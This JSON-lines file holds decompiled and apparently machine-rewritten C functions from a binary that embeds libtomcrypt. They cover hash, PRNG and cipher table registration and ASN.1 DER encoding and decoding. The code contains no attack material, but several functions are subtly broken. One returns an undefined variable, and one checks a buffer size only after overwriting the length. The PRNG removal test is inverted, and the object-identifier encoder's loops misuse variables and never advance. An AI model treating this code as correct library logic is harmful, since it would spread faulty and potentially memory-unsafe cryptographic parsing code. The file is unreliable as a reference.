{"Function Name": "FUN_004145a0", "Address": "004145a0", "Source Code": "int FUN_004145a0(undefined8 *inputHash)\n{\n    int index = 0; \n    undefined8 *dataPointer = &DAT_0064e5c0; \n    \n    if (inputHash == (undefined8 *)0x0) {\n        FUN_00410bc0(\"hash != NULL\",\"libtomcrypt.c\",0x457b); \n    }\n    \n    while (index < 0x100) {\n        \n        if (memcmp(dataPointer, inputHash, 0xd0) == 0) {\n            return index; \n        }\n        index++; \n        dataPointer += 0x1a; \n    }\n    index = 0; \n    long *dataPointer2 = &DAT_0064e5c0; \n    \n    while (index < 0x100) {\n        \n        if (*dataPointer2 == 0) {\n            dataPointer = &DAT_0064e5c0 + (long)index * 0x1a; \n            \n            for (long copyCounter = 0x1a; copyCounter != 0; copyCounter--) {\n                *dataPointer = *inputHash; \n                inputHash++; \n                dataPointer++; \n            }\n            return index; \n        }\n        index++; \n        dataPointer2 += 0x1a; \n    }\n    return -1; \n}"}
{"Function Name": "FUN_00414660", "Address": "00414660", "Source Code": "int FUN_00414660(undefined8 *inputParam)\n{\n    int index = 0; \n    undefined8 *dataArrayPtr = &DAT_006495c0; \n    \n    if (inputParam == (undefined8 *)0x0) {\n        \n        FUN_00410bc0(\"prng != NULL\",\"libtomcrypt.c\",0x45b2);\n    }\n    \n    do {\n        \n        if (memcmp(dataArrayPtr, inputParam, 0x50) == 0) {\n            return index; \n        }\n        index++; \n        dataArrayPtr += 10; \n    } while (index != 0x100); \n    long *dataArrayPtr2 = &DAT_006495c0; \n    index = 0; \n    \n    do {\n        \n        if (*dataArrayPtr2 == 0) {\n            \n            for (int innerIndex = 0; innerIndex < 10; innerIndex++) {\n                (&DAT_006495c0)[index * 10 + innerIndex] = inputParam[innerIndex];\n            }\n            return index; \n        }\n        index++; \n        dataArrayPtr2 += 10; \n    } while (index != 0x100); \n    return -1; \n}"}
{"Function Name": "FUN_00414890", "Address": "00414890", "Source Code": "int FUN_00414890(void *input_param) \n{\n    undefined8 *data_pointer = &data_location; \n    int index = 0; \n    if (input_param == (void *)0x0) { \n        FUN_00410bc0(\"cipher != NULL\",\"libtomcrypt.c\",0x45e9); \n    }\n    do {\n        if (memcmp(data_pointer, input_param, 0xb0) == 0) { \n            data_pointer[0] = 0; \n            (&another_data_structure)[index * 0xb0] = 0xff; \n            return 0; \n        }\n        index++; \n        data_pointer += 0x16; \n    } while (index != 0x100); \n    return 1; \n}"}
{"Function Name": "FUN_00414930", "Address": "00414930", "Source Code": "int FUN_00414930(void *input_param)\n{\n    \n    undefined8 *predefined_array = &DAT_0064e5c0;\n    \n    int index = 0;\n    \n    if (input_param == (void *)0x0) {\n        \n        FUN_00410bc0(\"hash != NULL\", \"libtomcrypt.c\", 0x4617);\n    }\n    \n    do {\n        \n        if (memcmp(predefined_array, input_param, 0xd0) == 0) {\n            \n            predefined_array[index * 0x1a] = 0;\n            \n            return 0;\n        }\n        \n        index++;\n        \n        predefined_array += 0x1a;\n    } while (index != 0x100); \n    \n    return 1;\n}"}
{"Function Name": "FUN_004149b0", "Address": "004149b0", "Source Code": "undefined8 FUN_004149b0(void *input_param)\n{\n    \n    if (input_param == (void *)0x0) {\n        \n        FUN_00410bc0(\"prng != NULL\",\"libtomcrypt.c\",0x4644);\n    }\n    \n    \n    undefined8 *data_pointer = &DAT_006495c0;\n    \n    \n    for (int iteration_index = 0; iteration_index < 0x100; iteration_index++) {\n        \n        if (memcmp(data_pointer, input_param, 0x50) != 0) {\n            \n            (&DAT_006495c0)[iteration_index * 10] = 0;\n            \n            return 0;\n        }\n        \n        data_pointer += 10;\n    }\n    \n    \n    return 1;\n}"}
{"Function Name": "FUN_00414a30", "Address": "00414a30", "Source Code": "undefined8 FUN_00414a30(byte *input_data, ulong input_length, undefined *output_data, ulong *output_length)\n{\n    byte second_byte; \n    undefined8 return_value = 0x10; \n    ulong combined_value; \n    \n    if (input_data == (byte *)0x0) {\n        FUN_00410bc0(\"in != NULL\", \"libtomcrypt.c\", 0x4678); \n    }\n    \n    if (output_data == (undefined *)0x0) {\n        FUN_00410bc0(\"out != NULL\", \"libtomcrypt.c\", 0x4679); \n    }\n    \n    if (output_length == (ulong *)0x0) {\n        FUN_00410bc0(\"outlen != NULL\", \"libtomcrypt.c\", 0x467a); \n    }\n    \n    \n    if ((3 < input_length) && (return_value = 7, (*input_data & 0x1f) == 3)) {\n        second_byte = input_data[1]; \n        \n        ulong length_value = (char)second_byte < '\\0' ? 2 : (ulong)(second_byte & 0x7f) + 2;\n        combined_value = (ulong)second_byte; \n        \n        if ((char)second_byte < '\\0' && 1 < (byte)((char)(second_byte & 0x7f) - 1U)) {\n            return 7; \n        }\n        \n        for (long index = 2; index < length_value; index++) {\n            combined_value = (ulong)input_data[index] | combined_value << 8; \n        }\n        \n        if ((combined_value != 0) && (length_value + combined_value <= input_length)) {\n            combined_value = (combined_value * 8 + -8) - (ulong)(input_data[length_value] & 7); \n            \n            if (*output_length < combined_value) {\n                *output_length = combined_value; \n                return_value = 6; \n            } else if (combined_value != 0) {\n                \n                *output_data = (char)((int)(uint)input_data[length_value + 1] >> 7);\n                \n                for (ulong bit_index = 0; bit_index < combined_value; bit_index++) {\n                    output_data[bit_index] = (byte)((int)(uint)input_data[length_value + 1 + (bit_index >> 3)] >> (7 - (bit_index & 7))) & 1;\n                }\n            }\n            *output_length = combined_value; \n            return_value = 0; \n        }\n    }\n    return return_value; \n}"}
{"Function Name": "FUN_00414bd0", "Address": "00414bd0", "Source Code": "undefined8 FUN_00414bd0(char *input_buffer, long condition_code, uint *output_value)\n{\n    \n    if (input_buffer == (char *)0x0) {\n        \n        FUN_00410bc0(\"in != NULL\", \"libtomcrypt.c\", 0x46db);\n    }\n    \n    \n    if (output_value == (uint *)0x0) {\n        \n        FUN_00410bc0(\"out != NULL\", \"libtomcrypt.c\", 0x46dc);\n    }\n    \n    \n    \n    if (condition_code == 3 && *input_buffer == '\\x01' && input_buffer[1] == '\\x01' && 0xfd < (byte)(input_buffer[2] - 1U)) {\n        \n        *output_value = (uint)(input_buffer[2] == -1);\n        \n        return 0;\n    }\n    \n    \n    return 0x10;\n}"}
{"Function Name": "FUN_004154a0", "Address": "004154a0", "Source Code": "undefined8 FUN_004154a0(byte *input_bytes, ulong length, ulong *output_value)\n{\n    ulong upper_limit; \n    undefined8 return_value = 7; \n    ulong accumulated_result = 0; \n    \n    if (output_value == (ulong *)0x0) {\n        FUN_00410bc0(\"num != NULL\", \"libtomcrypt.c\", 0x4cf9);\n    }\n    \n    if (input_bytes == (byte *)0x0) {\n        FUN_00410bc0(\"in != NULL\", \"libtomcrypt.c\", 0x4cfa);\n    }\n    \n    if ((1 < length) && ((*input_bytes & 0x1f) == 2)) {\n        upper_limit = (ulong)input_bytes[1] + 2; \n        \n        if (upper_limit <= length) {\n            \n            if ((ulong)input_bytes[1] != 0) {\n                \n                for (ulong index = 2; index < upper_limit; index++) {\n                    \n                    accumulated_result = (ulong)input_bytes[index] | accumulated_result << 8;\n                }\n            }\n            *output_value = accumulated_result; \n            return_value = 0; \n        }\n    }\n    return return_value; \n}"}
{"Function Name": "FUN_004159d0", "Address": "004159d0", "Source Code": "undefined8 FUN_004159d0(byte *input_buffer, ulong input_length, long output_buffer, ulong *output_length)\n{\n    byte current_byte; \n    uint temp_value; \n    undefined8 error_code = 7; \n    ulong calculated_size, loop_counter, byte_count, output_count; \n    uint decoded_value; \n    \n    if (input_buffer == (byte *)0x0) {\n        FUN_00410bc0(\"in != NULL\", \"libtomcrypt.c\", 0x4dd0);\n    }\n    \n    if (output_buffer == 0) {\n        FUN_00410bc0(\"out != NULL\", \"libtomcrypt.c\", 0x4dd1);\n    }\n    \n    if (output_length == (ulong *)0x0) {\n        FUN_00410bc0(\"outlen != NULL\", \"libtomcrypt.c\", 0x4dd2);\n    }\n    \n    \n    if ((1 < input_length) && ((*input_buffer & 0x1f) == 0xc)) {\n        calculated_size = 2; \n        current_byte = input_buffer[1]; \n        output_count = (ulong)current_byte; \n        \n        if ((char)current_byte < '\\0') {\n            calculated_size = (ulong)(current_byte & 0x7f); \n            \n            if (2 < calculated_size - 1 || input_length < calculated_size + 1) {\n                return 7; \n            }\n            calculated_size += 2; \n            output_count = 0; \n            \n            for (loop_counter = 2; loop_counter < calculated_size; loop_counter++) {\n                output_count = (ulong)input_buffer[loop_counter] | output_count << 8; \n            }\n        }\n        \n        if (input_length < output_count + calculated_size) {\n            return 7; \n        }\n        \n        \n        while (calculated_size < input_length) {\n            byte_count = 0; \n            loop_counter = calculated_size + 1; \n            decoded_value = (uint)input_buffer[calculated_size]; \n            \n            if ((char)input_buffer[calculated_size] < '\\0') {\n                \n                while (true) {\n                    temp_value = decoded_value * 2; \n                    byte_count++; \n                    decoded_value = temp_value & 0xff; \n                    if ((temp_value & 0x80) == 0) break; \n                    if (byte_count == 5) {\n                        return 7; \n                    }\n                }\n                if (byte_count == 5) {\n                    return 7; \n                }\n            }\n            \n            if (input_length < byte_count + calculated_size) {\n                return 7; \n            }\n            decoded_value >>= ((byte)byte_count & 0x1f); \n            \n            if (byte_count >= 2) {\n                byte_count--; \n                current_byte = input_buffer[loop_counter]; \n                \n                if ((current_byte & 0xc0) != 0x80) {\n                    return 7; \n                }\n                byte_count = loop_counter + byte_count; \n                loop_counter = calculated_size + 2; \n                \n                while (loop_counter != byte_count) {\n                    current_byte = input_buffer[loop_counter]; \n                    \n                    if ((current_byte & 0xc0) != 0x80) {\n                        return 7; \n                    }\n                    decoded_value = current_byte & 0x3f | decoded_value << 6; \n                    loop_counter++; \n                }\n            }\n            \n            if (*output_length < output_count) {\n                *output_length = output_count; \n                return 6; \n            }\n            output_count++; \n            *(uint *)(output_buffer + -4 + output_count * 4) = decoded_value; \n            calculated_size = loop_counter; \n        }\n    }\n    *output_length = output_count; \n    return 0; \n}"}
{"Function Name": "FUN_00415c10", "Address": "00415c10", "Source Code": "undefined8 FUN_00415c10(int input_value, undefined *output_buffer, ulong *output_length)\n{\n    \n    if (output_length == (ulong *)0x0) {\n        \n        FUN_00410bc0(\"outlen != NULL\", \"libtomcrypt.c\", 0x4e96);\n    }\n    \n    \n    if (output_buffer == (undefined *)0x0) {\n        \n        FUN_00410bc0(\"out != NULL\", \"libtomcrypt.c\", 0x4e97);\n    }\n    \n    \n    *output_length = 3;\n    \n    \n    if (*output_length < 3) {\n        \n        return 6;\n    }\n    \n    \n    output_buffer[0] = 1;\n    \n    \n    output_buffer[1] = 1;\n    \n    \n    output_buffer[2] = -(input_value != 0);\n    \n    \n    return 0;\n}"}
{"Function Name": "FUN_00415fc0", "Address": "00415fc0", "Source Code": "undefined8 FUN_00415fc0(ulong bit_length,long *output_length)\n{\n    \n    if (output_length == (long *)0x0) {\n        \n        FUN_00410bc0(\"outlen != NULL\",\"libtomcrypt.c\",0x54e1);\n    }\n    \n    \n    ulong calculated_length = (bit_length >> 3) + (ulong)((bit_length & 7) != 0) + 1;\n    \n    if (calculated_length < 0x80) {\n        \n        *output_length = calculated_length + 2;\n        return 0; \n    }\n    \n    \n    if (calculated_length < 0x100) {\n        \n        *output_length = calculated_length + 3;\n        return 0; \n    }\n    \n    \n    if (0xffff < calculated_length) {\n        return 0x10; \n    }\n    \n    \n    *output_length = calculated_length + 4;\n    return 0; \n}"}
{"Function Name": "FUN_00416080", "Address": "00416080", "Source Code": "undefined8 FUN_00416080(long input_pointer, ulong input_length, undefined *output_buffer, ulong *output_length) {\n    undefined single_byte_value; \n    undefined8 return_value; \n    ulong output_length_calculated; \n    uint bit_manipulation_result; \n    bool has_remaining_bits; \n    ulong intermediate_results[2]; \n    \n    if (input_pointer == 0) {\n        FUN_00410bc0(\"in != NULL\", \"libtomcrypt.c\", 0x4e42);\n    }\n    \n    if (output_buffer == (undefined *)0x0) {\n        FUN_00410bc0(\"out != NULL\", \"libtomcrypt.c\", 0x4e43);\n    }\n    \n    if (output_length == (ulong *)0x0) {\n        FUN_00410bc0(\"outlen != NULL\", \"libtomcrypt.c\", 0x4e44);\n    }\n    \n    return_value = FUN_00415fc0(input_length, intermediate_results);\n    \n    if ((int)return_value == 0) {\n        \n        if (intermediate_results[0] <= *output_length) {\n            \n            has_remaining_bits = (input_length & 7) != 0;\n            *output_buffer = 3; \n            output_length_calculated = (input_length >> 3) + 1 + (ulong)has_remaining_bits; \n            single_byte_value = (undefined)output_length_calculated; \n            long output_index; \n            \n            if (output_length_calculated < 0x80) {\n                output_buffer[1] = single_byte_value; \n                output_length_calculated = 3; \n                output_index = 2; \n            } else if (output_length_calculated < 0x100) {\n                output_buffer[1] = 0x81; \n                output_buffer[2] = single_byte_value; \n                output_length_calculated = 4; \n                output_index = 3; \n            } else if (output_length_calculated < 0x10000) {\n                output_buffer[1] = 0x82; \n                output_buffer[3] = single_byte_value; \n                output_index = 4; \n                output_buffer[2] = (char)(output_length_calculated >> 8); \n                output_length_calculated = 5; \n            } else {\n                output_length_calculated = 2; \n                output_index = 1; \n            }\n            bit_manipulation_result = 0; \n            output_buffer[output_index] = -(char)input_length & 7; \n            \n            if (input_length != 0) {\n                ulong input_index = 0; \n                do {\n                    \n                    while (bit_manipulation_result |= (uint)(*(char *)(input_pointer + input_index) != '\\0') << (~(byte)input_index & 7), \n                           ((uint)input_index & 7) == 7) {\n                        input_index++; \n                        output_buffer[output_length_calculated++] = (undefined)bit_manipulation_result; \n                        bit_manipulation_result = 0; \n                    }\n                    input_index++; \n                } while (input_index != input_length); \n            }\n            \n            if (has_remaining_bits) {\n                output_buffer[output_length_calculated++] = (undefined)bit_manipulation_result; \n            }\n            *output_length = output_length_calculated; \n            return 0; \n        }\n        *output_length = intermediate_results[0]; \n        return_value = 6; \n    }\n    return return_value; \n}"}
{"Function Name": "FUN_00416330", "Address": "00416330", "Source Code": "undefined8 FUN_00416330(byte *input_bytes, ulong input_length, long *output_length)\n{\n    byte *end_pointer; \n    long index;   \n    \n    if (output_length == (long *)0x0) {\n        FUN_00410bc0(\"outlen != NULL\", \"libtomcrypt.c\", 0x55bf); \n    }\n    \n    if (input_bytes == (byte *)0x0) {\n        FUN_00410bc0(\"octets != NULL\", \"libtomcrypt.c\", 0x55c0); \n    }\n    \n    if (input_length != 0) {\n        end_pointer = input_bytes + input_length; \n        do {\n            index = 0; \n            \n            while ((uint)*input_bytes != (&DAT_0043e280)[index * 2]) {\n                index++; \n                \n                if (index == 0x66) {\n                    return 0x10; \n                }\n            }\n            \n            if (*(int *)(&DAT_0043e284 + (long)(int)index * 8) == -1) {\n                return 0x10; \n            }\n            input_bytes++; \n        } while (input_bytes != end_pointer); \n        \n        \n        if (0x7f < input_length) {\n            if (input_length < 0x100) {\n                *output_length = input_length + 3; \n                return 0; \n            }\n            if (input_length < 0x10000) {\n                *output_length = input_length + 4; \n                return 0; \n            }\n            if (input_length < 0x1000000) {\n                *output_length = input_length + 5; \n                return 0; \n            }\n            return 0x10; \n        }\n    }\n    *output_length = input_length + 2; \n    return 0; \n}"}
{"Function Name": "FUN_00416440", "Address": "00416440", "Source Code": "undefined8 FUN_00416440(long input_pointer, ulong input_length, undefined *output_buffer, ulong *output_length)\n{\n    undefined byte_value; \n    ulong output_length_value; \n    ulong loop_counter; \n    ulong temporary_values[2]; \n    \n    if (input_pointer == 0) {\n        FUN_00410bc0(\"in != NULL\", \"libtomcrypt.c\", 0x4ecc);\n    }\n    \n    if (output_buffer == (undefined *)0x0) {\n        FUN_00410bc0(\"out != NULL\", \"libtomcrypt.c\", 0x4ecd);\n    }\n    \n    if (output_length == (ulong *)0x0) {\n        FUN_00410bc0(\"outlen != NULL\", \"libtomcrypt.c\", 0x4ece);\n    }\n    \n    \n    if ((int)FUN_00416330(input_pointer, input_length, temporary_values) != 0) {\n        return uVar2; \n    }\n    \n    \n    if (*output_length < temporary_values[0]) {\n        *output_length = temporary_values[0]; \n        return 6; \n    }\n    \n    *output_buffer = 0x16; \n    \n    if (input_length < 0x80) {\n        output_buffer[1] = (undefined)input_length; \n        output_length_value = 2; \n    } else if (input_length < 0x100) {\n        output_buffer[1] = 0x81; \n        output_buffer[2] = (undefined)input_length; \n        output_length_value = 3; \n    } else if (input_length < 0x10000) {\n        output_buffer[1] = 0x82; \n        output_buffer[2] = (undefined)(input_length >> 8); \n        output_buffer[3] = (undefined)input_length; \n        output_length_value = 4; \n    } else {\n        \n        if (0xffffff < input_length) {\n            return 0x10; \n        }\n        output_buffer[1] = 0x83; \n        output_buffer[2] = (char)(input_length >> 0x10); \n        output_buffer[3] = (undefined)(input_length >> 8); \n        output_buffer[4] = (undefined)input_length; \n        output_length_value = 5; \n    }\n    \n    loop_counter = 0; \n    do {\n        long inner_loop_counter = 0; \n        do {\n            \n            if ((uint)*(byte *)(input_pointer + loop_counter) == (&DAT_0043e280)[inner_loop_counter * 2]) {\n                byte_value = (&DAT_0043e284)[(long)(int)inner_loop_counter * 8]; \n                goto LAB_00416507; \n            }\n            inner_loop_counter++; \n        } while (inner_loop_counter != 0x66); \n        byte_value = 0xff; \n    LAB_00416507:\n        output_buffer[loop_counter + output_length_value] = byte_value; \n        loop_counter++; \n    } while (loop_counter != input_length); \n    \n    *output_length = output_length_value + loop_counter; \n    return 0; \n}"}
{"Function Name": "FUN_00416600", "Address": "00416600", "Source Code": "undefined8 FUN_00416600(long inputParameter,long *outputLengthPointer)\n{\n    ulong valueFromFunctionCall; \n    long outputLength;  \n    ulong calculatedOutputLength; \n    \n    if (inputParameter == 0) {\n        FUN_00410bc0(\"num != NULL\",\"libtomcrypt.c\",0x5601);\n    }\n    \n    \n    if (outputLengthPointer == (long *)0x0) {\n        FUN_00410bc0(\"outlen != NULL\",\"libtomcrypt.c\",0x5602);\n    }\n    \n    \n    if ((*DAT_00669960)(inputParameter,0) == -1) {\n        valueFromFunctionCall = (*DAT_00669968)(inputParameter); \n        \n        calculatedOutputLength = ((long)(*DAT_00669968)(inputParameter) & 0xfffffffffffffff8U) + 8;\n        \n        \n        if (((*DAT_00669970)(inputParameter) + 1 == (*DAT_00669968)(inputParameter)) && ((valueFromFunctionCall & 7) == 0)) {\n            calculatedOutputLength = ((long)(*DAT_00669968)(inputParameter) & 0xfffffffffffffff8U) + 7;\n        }\n        calculatedOutputLength = calculatedOutputLength >> 3; \n    } else {\n        valueFromFunctionCall = (*DAT_00669968)(); \n        calculatedOutputLength = 1; \n        \n        \n        if ((valueFromFunctionCall & 7) != 0) {\n            calculatedOutputLength = (ulong)((*DAT_00669960)(inputParameter,0) == 0); \n        }\n        \n        outputLength = (*DAT_00669990)(inputParameter); \n        calculatedOutputLength += outputLength; \n    }\n    \n    outputLength = calculatedOutputLength + 1; \n    \n    \n    if (0x7f < calculatedOutputLength) {\n        do {\n            calculatedOutputLength = calculatedOutputLength >> 8; \n            outputLength++; \n        } while (calculatedOutputLength != 0); \n    }\n    \n    *outputLengthPointer = outputLength + 1; \n    return 0; \n}"}
{"Function Name": "FUN_00416730", "Address": "00416730", "Source Code": "\nulong FUN_00416730(long input_num, undefined *output_buffer, ulong *output_length)\n{\n    int return_value; // Variable to hold return values from function calls\n    uint unsigned_value; // Variable to hold unsigned integer values\n    int another_return_value; // Variable to hold another integer return value\n    uint another_unsigned_value; // Variable to hold another unsigned integer value\n    ulong result_value; // Variable to hold the result to be returned\n    ulong temp_ulong; // Variable to hold another ulong value\n    long long_value; // Variable to hold a long value\n    undefined casted_result; // Variable to hold an undefined value\n    undefined *output_pointer; // Pointer to traverse the output buffer\n    bool condition_flag; // Boolean flag for conditions\n    ulong local_size; // Local variable to hold a length or size\n    undefined8 temp_data_array[2]; // Local array to hold temporary data\n\n    // Check if param_1 is NULL and log an error if it is\n    if (input_num == 0) {\n        FUN_00410bc0(\"num != NULL\", \"libtomcrypt.c\", 0x4f22);\n    }\n    // Check if param_2 is NULL and log an error if it is\n    if (output_buffer == (undefined *)0x0) {\n        FUN_00410bc0(\"out != NULL\", \"libtomcrypt.c\", 0x4f23);\n    }\n    // Check if param_3 is NULL and log an error if it is\n    if (output_length == (ulong *)0x0) {\n        FUN_00410bc0(\"outlen != NULL\", \"libtomcrypt.c\", 0x4f24);\n    }\n    // Call another function to get a size and store it in local_48\n    result_value = FUN_00416600(input_num, &local_size);\n    // Check if the function call was successful\n    if ((int)result_value == 0) {\n        // Check if the provided output length is less than the local size\n        if (*output_length < local_size) {\n            *output_length = local_size; // Update output length\n            result_value = 6; // Set return value to indicate a specific condition\n        } else {\n            // Call a function to get a value based on param_1\n            return_value = (*DAT_00669960)(input_num, 0);\n            // Check if the return value indicates an error\n            if (return_value == -1) {\n                // Call another function to get a different value\n                return_value = (*DAT_00669968)(input_num);\n                condition_flag = false; // Initialize boolean flag\n                another_return_value = (*DAT_00669970)(input_num); // Get another value\n                // Calculate the size based on the return values\n                result_value = ((long)return_value & 0xfffffffffffffff8U) + 8 >> 3;\n                return_value = (*DAT_00669968)(input_num);\n                // Adjust size if certain conditions are met\n                if (another_return_value + 1 == return_value) {\n                    temp_ulong = (*DAT_00669968)(input_num);\n                    result_value = result_value - ((temp_ulong & 7) == 0);\n                }\n            } else {\n                // If no error, get another value\n                temp_ulong = (*DAT_00669968)();\n                result_value = 1; // Set return value to indicate success\n                condition_flag = true; // Set boolean flag to true\n                // Check if the value has certain properties\n                if ((temp_ulong & 7) != 0) {\n                    return_value = (*DAT_00669960)(input_num, 0);\n                    condition_flag = return_value == 0; // Update boolean flag based on condition\n                    result_value = (ulong)condition_flag; // Set return value based on flag\n                }\n                // Get a long value based on param_1\n                long_value = (*DAT_00669990)(input_num);\n                result_value = result_value + long_value; // Update return value\n            }\n            *output_buffer = 2; // Set the first byte of output\n            casted_result = (undefined)result_value; // Cast uVar6 to undefined type\n            // Determine how to encode the length based on its size\n            if (result_value < 0x80) {\n                output_pointer = output_buffer + 2; // Set pointer for output\n                output_buffer[1] = casted_result; // Store length in output\n            } else if (result_value < 0x100) {\n                output_buffer[1] = 0x81; // Set type for length\n                output_pointer = output_buffer + 3; // Update pointer\n                output_buffer[2] = casted_result; // Store length in output\n            } else {\n                if (result_value < 0x10000) {\n                    output_buffer[1] = 0x82; // Set type for length\n                    output_pointer = output_buffer + 4; // Update pointer\n                    output_buffer[2] = (undefined)(result_value >> 8); // Store high byte\n                    output_buffer[3] = casted_result; // Store low byte\n                } else {\n                    if (0xffffff < result_value) {\n                        return 0x10; // Return error code for too large length\n                    }\n                    output_buffer[1] = 0x83; // Set type for length\n                    output_pointer = output_buffer + 5; // Update pointer\n                    output_buffer[2] = (char)(result_value >> 0x10); // Store high byte\n                    output_buffer[3] = (undefined)(result_value >> 8); // Store middle byte\n                    output_buffer[4] = casted_result; // Store low byte\n                }\n            }\n            // If the boolean flag is true, set the next byte to 0\n            if (condition_flag) {\n                *output_pointer = 0; // Set next byte to 0\n                output_pointer++; // Move pointer forward\n            }\n            // Check if the first function returns a specific value\n            return_value = (*DAT_00669960)(input_num, 0);\n            if (return_value == 1) {\n                // Call another function to process data\n                result_value = (*DAT_00669998)(input_num, output_pointer);\n                // Check for errors in the function call\n                if ((int)result_value != 0) {\n                    return result_value; // Return error code\n                }\n            } else {\n                // If the first function does not return 1, check its value\n                return_value = (*DAT_00669960)(input_num, 0);\n                if (return_value != 0) {\n                    // Allocate memory for local_40\n                    return_value = (*DAT_00669910)(temp_data_array);\n                    // Check for allocation errors\n                    if (return_value != 0) {\n                        return 0xd; // Return error code for allocation failure\n                    }\n                    // Get another value based on param_1\n                    unsigned_value = (*DAT_00669968)(input_num);\n                    return_value = (*DAT_00669970)(input_num);\n                    // Calculate size for processing\n                    another_unsigned_value = (unsigned_value & 0xfffffff8) + 8;\n                    another_return_value = (*DAT_00669968)(input_num);\n                    // Adjust size if certain conditions are met\n                    if ((return_value + 1 == another_return_value) && (result_value = (*DAT_00669968)(input_num), (result_value & 7) == 0)) {\n                        another_unsigned_value = unsigned_value & 0xfffffff8;\n                    }\n                    // Call a function to process data\n                    return_value = (*DAT_00669978)(temp_data_array[0], another_unsigned_value);\n                    // Check for errors in the processing function\n                    if ((return_value != 0) || (return_value = (*DAT_006699a8)(temp_data_array[0], input_num, temp_data_array[0]), return_value != 0)) {\n                        (*DAT_00669920)(temp_data_array[0]); // Free allocated memory\n                        return 0xd; // Return error code for processing failure\n                    }\n                    // Call another function to finalize processing\n                    another_unsigned_value = (*DAT_00669998)(temp_data_array[0], output_pointer);\n                    // Check for errors in the final function call\n                    if (another_unsigned_value != 0) {\n                        (*DAT_00669920)(temp_data_array[0]); // Free allocated memory\n                        return (ulong)another_unsigned_value; // Return error code\n                    }\n                    (*DAT_00669920)(temp_data_array[0]); // Free allocated memory\n                }\n            }\n            *output_length = local_size; // Update output length\n            result_value = 0; // Set return value to indicate success\n        }\n    }\n    return result_value; // Return the final result\n}\n"}
{"Function Name": "FUN_00416ae0", "Address": "00416ae0", "Source Code": "undefined8 FUN_00416ae0(ulong *input_array, ulong input_length, long *output_length)\n{\n    ulong bit_mask, processed_bits_count, current_value; \n    long final_output_length; \n    ulong bit_counter = 0, index_counter = 2; \n    \n    if (input_array == (ulong *)0x0) {\n        FUN_00410bc0(\"words != NULL\", \"libtomcrypt.c\", 0x565f); \n    }\n    \n    if (output_length == (long *)0x0) {\n        FUN_00410bc0(\"outlen != NULL\", \"libtomcrypt.c\", 0x5660); \n    }\n    \n    if (((1 < input_length) && (current_value = *input_array, current_value < 4)) && ((1 < current_value || (input_array[1] < 0x28)))) {\n        processed_bits_count = 0; \n        current_value = input_array[1] + current_value * 0x28; \n        do {\n            bit_mask = current_value & 0xffffffff; \n            if (bit_mask != 0) { \n                bit_counter = 0; \n                do {\n                    bit_counter++; \n                    bit_mask >>= 1; \n                } while (bit_mask != 0); \n                bit_mask = bit_counter / 7; \n                bit_counter = (ulong)(bit_counter % 7 != 0); \n            }\n            processed_bits_count += (current_value == 0) + bit_mask + bit_counter; \n            if (index_counter - 1 < input_length - 1) { \n                current_value = input_array[index_counter]; \n            }\n        } while (index_counter++ < input_length); \n        \n        \n        if (processed_bits_count < 0x80) {\n            final_output_length = processed_bits_count + 2; \n        } else if (processed_bits_count < 0x100) {\n            final_output_length = processed_bits_count + 3; \n        } else {\n            if (0xffff < processed_bits_count) { \n                return 0x10; \n            }\n            final_output_length = processed_bits_count + 4; \n        }\n        *output_length = final_output_length; \n        return 0; \n    }\n    return 0x10; \n}"}
{"Function Name": "FUN_00416c60", "Address": "00416c60", "Source Code": "undefined8 FUN_00416c60(long *param_1, ulong param_2, undefined *param_3, ulong *param_4)\n{\n    undefined singleByteValue; \n    undefined8 returnValue; \n    ulong loopControl; \n    ulong computedValue; \n    ulong accumulatedCounts; \n    ulong temporaryValues[2]; \n    \n    if (param_1 == (long *)0x0) {\n        FUN_00410bc0(\"words != NULL\", \"libtomcrypt.c\", 0x4fa4);\n    }\n    \n    if (param_3 == (undefined *)0x0) {\n        FUN_00410bc0(\"out != NULL\", \"libtomcrypt.c\", 0x4fa5);\n    }\n    \n    if (param_4 == (ulong *)0x0) {\n        FUN_00410bc0(\"outlen != NULL\", \"libtomcrypt.c\", 0x4fa6);\n    }\n    \n    returnValue = FUN_00416ae0(param_1, param_2, temporaryValues);\n    \n    if ((int)returnValue != 0) {\n        return returnValue;\n    }\n    \n    if (*param_4 < temporaryValues[0]) {\n        *param_4 = temporaryValues[0]; \n        return 6; \n    }\n    \n    computedValue = param_1[1] + *param_1 * 0x28;\n    \n    if (param_2 < 2) {\n        *param_3 = 6; \n        param_3[1] = 0; \n        computedValue = 2; \n    } else {\n        ulong accumulatedCounts = 0; \n        loopControl = 2; \n        do {\n            ulong maskedValue = computedValue & 0xffffffff; \n            \n            ulong leadingZerosCount = (maskedValue == 0) ? 0 : __builtin_clz(maskedValue) / 7 + (maskedValue != (1UL << (64 - __builtin_clz(maskedValue))) - 1);\n            accumulatedCounts += (computedValue == 0) + leadingZerosCount; \n            \n            if (loopControl - 1 < param_2 - 1) {\n                computedValue = param_1[loopControl];\n            }\n        } while (++loopControl < param_2); \n        *param_3 = 6; \n        \n        if (accumulatedCounts < 0x80) {\n            param_3[1] = 0; \n        } else if (accumulatedCounts < 0x100) {\n            param_3[1] = 0x81; \n            param_3[2] = (char)accumulatedCounts; \n            computedValue = 3; \n        } else {\n            \n            if (accumulatedCounts > 0xffff) {\n                return 0x10; \n            }\n            param_3[1] = 0x82; \n            param_3[2] = (char)(accumulatedCounts >> 8); \n            param_3[3] = (char)accumulatedCounts; \n            computedValue = 4; \n        }\n    }\n    loopControl = 2; \n    do {\n        \n        if ((accumulatedCounts & 0xffffffff) == 0) {\n            param_3[computedValue++] = 0; \n        } else {\n            uint continuationBit = 0; \n            ulong maskedAccumulatedCount = accumulatedCounts & 0xffffffff; \n            while (true) {\n                param_3[computedValue++] = (char)(continuationBit | (maskedAccumulatedCount & 0x7f)); \n                \n                if (maskedAccumulatedCount >> 7 == 0) break; \n                continuationBit = 0x80; \n                maskedAccumulatedCount >>= 7; \n            }\n        }\n    } while (loopControl - 1 < param_2 - 1); \n    *param_4 = computedValue; \n    return 0; \n}"}
{"Function Name": "FUN_00416f50", "Address": "00416f50", "Source Code": "undefined8 FUN_00416f50(ulong input_value,long *output_pointer)\n{\n    \n    if (output_pointer == (long *)0x0) {\n        \n        FUN_00410bc0(\"outlen != NULL\",\"libtomcrypt.c\",0x56a8);\n    }\n    \n    \n    if (0x7f < input_value) {\n        \n        if (input_value < 0x100) {\n            \n            *output_pointer = input_value + 3;\n            return 0; \n        }\n        \n        if (input_value < 0x10000) {\n            \n            *output_pointer = input_value + 4;\n            return 0; \n        }\n        \n        if (input_value < 0x1000000) {\n            \n            *output_pointer = input_value + 5;\n            return 0; \n        }\n        \n        return 0x10;\n    }\n    \n    \n    *output_pointer = input_value + 2;\n    return 0; \n}"}
